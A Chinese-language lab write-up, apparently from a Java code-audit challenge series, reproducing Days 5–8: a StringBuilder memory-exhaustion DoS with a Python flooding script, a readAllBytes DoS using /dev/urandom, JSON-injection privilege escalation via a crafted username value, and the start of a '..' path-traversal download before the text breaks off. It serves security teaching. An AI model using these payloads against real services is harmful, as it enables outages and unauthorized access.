# Day5 拒绝服务攻击-StringBuilder
### 代码
Day 5  
### 漏洞点
代码的第6行实例化了StringBuilder对象，并将攻击者可控的参数值附加到其中。java.util.StringBuilder的内部原因，可能会导致拒绝服务问题。默认情况下，StringBuilder对象使用大小为16的数组进行初始化，StringBuilder实例会检查数据是否适合该数组。如果不是，则数组的大小会加倍。在这种情况下，会有很大的方法，这可能导致java堆内存不足，从而导致拒绝服务攻击。
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 添加主函数
Day5.java
    package com.ananaskr.day5;
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    public class Day5 extends HttpServlet {
        public void init() throws ServletException {
        }
        public void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
            Request request = new Request();
            request.toString(req);
        }
        public void destroy(){
        }
    }
#### 3\. 配置web.xml
      Archetype Created Web Application
        Request
        com.ananaskr.day5.Day5
        Request
        /day5
#### 4\. 构造payload
在分析漏洞点的情况下，可以选择使用比较大的delim参数，以及构造数量足够多的其他参数。  
默认情况下，Apache
Tomcat的POST请求限制为2MB，最大参数为10000.如果结合数组和大量(例如10000)HTTP参数提交非常大的参数delim(例如1.8M)值，那么考虑到StringBuilder内部，我们的最大放大倍数约为20000。  
在这里编写了一个脚本用于测试
    import requests
    url = "http://localhost:8080/Day5_war_exploded/day5"
    delim = ""
    A=[]
    data="delim="+delim
    for i in range(1,30000):
        delim = delim+'------------------------------------------------'
    for i in range(1,300):
        A.append("test_the_DoS")
        data=data+"&A{index}=".format(index=i)+A[i-1]
    header={'content-type':"application/x-www-form-urlencoded"}
    res=requests.post(url=url,data=data,headers=header)
    print(res)
#### 5\. 结果
在设置了300个POST参数后，delim的值为1.4M，就会出现堆内存空间不足。如图所示:  
# Day6 拒绝服务攻击-readAllBytes()
### 代码
Day 6  
### 漏洞点
代码中的第9行从参数url接收不受信任的用户输入。然后给定的值创建一个java.nio.file.Path实例，该文件的内容由方法java.nio.file.Files.readAllBytes()读取。那么所考虑的就是发送一个可以一直读的文件路径，从而消耗Java堆内存。当文件路径名为"/dev/urandom"值时，在Java堆内存不足之前，Files.readAllBytes()方法不会终止。这将导致无限的文件读取，并最终导致IOException处理程序无法捕获的内存耗尽。
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 配置web.xml
      Archetype Created Web Application
        Request
        com.ananaskr.day6.ReadFile
        Request
        /day6
#### 3\. 构造payload
将请求的参数url= **/dev/urandom** 即可使其堆空间消耗完毕，从而拒绝服务。
#### 4\. 结果
# Day7 权限提升
### 代码
Day 7  
### 漏洞点
在ApiCache类的storeJson方法中，post请求中的username值是攻击者可控的。此函数的作用是获取username的值，作为username域的值，其中赋予的权限permission为"none"。然而，由于未对用户传入的参数username进行过滤，导致可以写入任意的域-值对。从而进行权限提升。
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 补全代码
  * 添加异常处理，并将Get请求补全，便于验证。Get请求原来的意思表示的是取json中的前两项作为结果。  
ApiCahche.java
    public static void loadJson() throws IOException {
            // Deserialize to an HashMap object with Jackson's JsonParser and read the first 2 entries of the file.
            JsonFactory jsonobject = new JsonFactory();
            JsonParser parser = jsonobject.createParser(new File("/tmp/getUserInformation.json"));
            parser.nextToken();
            parser.nextToken();
            String field1 = parser.getValueAsString();
            parser.nextToken();
            String username = parser.getValueAsString();
            parser.nextToken();
            String field2 = parser.getValueAsString();
            parser.nextToken();
            String permission = parser.getValueAsString();
            System.out.println(field1+": "+username);
            System.out.println(field2+": "+permission);
        }
#### 3\. 配置web.xml
web.xml
      Archetype Created Web Application
        day7
        com.ananaskr.day7.ApiCache
        day7
        /day7
#### 4\. 构造payload
正常情况下，请求发送正常的username值，"/tmp/getUSerInformation.json"的内容如下:
    /tmp/getUserInfomation.json:
    {
      "username":"xxx",
      "permission":"none"
    }
当攻击者发送username=xxx","permission":"all，"/tmp/getUSerInformation.json"的内容如下:
    /tmp/getUserInfomation.json:
    {
      "username":"xxx",
      "permission":"all",
      "permission":"none"
    }
由于在Get请求中，对json处理时，只读取了username域以及一个permission的值"all"，导致权限提升。  
在发送请求时，将username参数值进行url编码后，发送出去。  
#### 5\. 结果
可以看出get请求，得出来的权限确实提升为all了。  
# Day8 未授权文件下载
### 代码
Day 8  
### 漏洞点
这段代码的主要功能是可下载读取"/var/myapp/data/"目录下的文件。其中getName()函数对输入内容进行了一个简单的过滤以防止目录遍历。然而，getName()只能进行简单的过滤，比如对../进行过滤。但是对于仅..的情况，却未进行任何过滤。因此，导致可以下载到上级目录下的所有文件。
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 补全代码
  * 添加打印能够获取的文件的路径，便于验证  
GetPath.java
    // Download file...
                PrintWriter out = response.getWriter();
                out.println("The File is: "+toDir+filename);
  * 然后将doGet方法改为doPost方法。